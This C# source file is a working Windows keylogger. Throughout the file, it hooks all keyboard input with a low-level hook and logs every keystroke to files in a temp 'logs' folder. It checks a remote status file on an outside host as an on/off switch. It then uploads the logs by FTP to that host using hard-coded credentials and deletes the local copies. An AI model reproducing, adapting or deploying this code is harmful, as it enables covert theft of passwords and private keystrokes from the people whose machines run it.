using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
//using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Timers;
using System.Net;


class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    public static Int32 _flag = -1;
    public static string _filename = DateTime.Now.ToString("yyyy-MM-dd") + ".txt";
    public static string _path= GetTemporaryDirectory();
    public static string _filename2 ;
    

    public static void Main()
    {
        try
        {

            //TextWriter tw = new StreamWriter("path.txt", true);
            string[] array1 = Directory.GetFiles(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "logs"));
            foreach (string name in array1)
            {

                string[] split = name.Split(new char[] { '\\' });
                foreach (string bloc in split)
                {
                    if (bloc.EndsWith(".txt"))
                        _filename2 = bloc;
                }
                uploadImage(_filename2, name);
                File.Delete(name);
                _filename2 = "";
            }
        }
        catch
        {

        }
        //DateTime time = DateTime.Now;
        //string _filename = time.ToString("yyyy-MM-dd") + ".txt";

        //string _path = GetTemporaryDirectory();

        System.Timers.Timer aTimer = new System.Timers.Timer();
        aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
        aTimer.Interval = 10000;
        aTimer.Enabled = true;

        System.Timers.Timer bTimer = new System.Timers.Timer();
        bTimer.Elapsed += new ElapsedEventHandler(uploadEvent);
        bTimer.Interval = 30000;
        bTimer.Enabled = true;

        
        //var handle = GetConsoleWindow();

        // Hide
        //ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

        

    }

    private static void uploadEvent(object sender, ElapsedEventArgs e)
    {
        if (_flag == 1)
        {

            try
            {

                uploadImage(_filename,(_path+_filename));

                //TextWriter tw = new StreamWriter("path.txt", true);
                //string[] array1 = Directory.GetFiles(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "logs"));
                //foreach (string name in array1)
                //{

                //    string[] split = name.Split(new char[] { '\\' });
                //    foreach (string bloc in split)
                //    {
                //        if (bloc.EndsWith(".txt"))
                //            filename = bloc;
                //    }
                //    uploadImage(filename, name);
                //    File.Delete(name);
                //    filename = "";
                //}
            }
            catch
            {

            }
        }
    }

    private static void OnTimedEvent(object source, ElapsedEventArgs e)
    {
        
        int check = connection();
        if (check == 1)
        {
            _flag = 1;
            

        }
        else if (check == 0)
        {
            _flag = 0;
            
        }
        else
        {
            _flag = -1;
        }
    }

    private static int connection()
    {
        try
        {
            
            WebClient client = new WebClient();
            Stream stream = client.OpenRead("http://www.jugaad.eu.pn/keylogger/status.txt");
            StreamReader reader = new StreamReader(stream);
            String content = reader.ReadToEnd();
            if (content.Equals("1"))
            {
                return 1;
            }
            else if (content.Equals("0"))
            {
                return 0;
            }
            else
            {
                return 1;
            }
        }
        catch
        {
            return -1;
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
       
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            //Console.WriteLine((Keys)vkCode);
            if (_flag != 0)
            {
                DateTime time = DateTime.Now;
                string name = time.ToString("yyyy-MM-dd");
                string _path = GetTemporaryDirectory();
                StreamWriter sw = new StreamWriter(System.IO.Path.Combine(_path, (name + ".txt")), true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static string GetTemporaryDirectory()
    {
        string tempDirectory = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "logs\\");
        Directory.CreateDirectory(tempDirectory);
        return tempDirectory;
    }

    private static void uploadImage(string name, string address)
    {
        try
        {
            FtpWebRequest req = (FtpWebRequest)WebRequest.Create("ftp://jugaad.eu.pn/jugaad.eu.pn/keylogger/logs/" + name);
            req.UseBinary = true;
            req.Method = WebRequestMethods.Ftp.UploadFile;
            req.Credentials = new NetworkCredential("858139_jugaad", "reliance3g");
            byte[] fileData = File.ReadAllBytes(address);

            req.ContentLength = fileData.Length;
            Stream reqStream = req.GetRequestStream();
            reqStream.Write(fileData, 0, fileData.Length);
            reqStream.Close();
        }
        catch
        {

        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}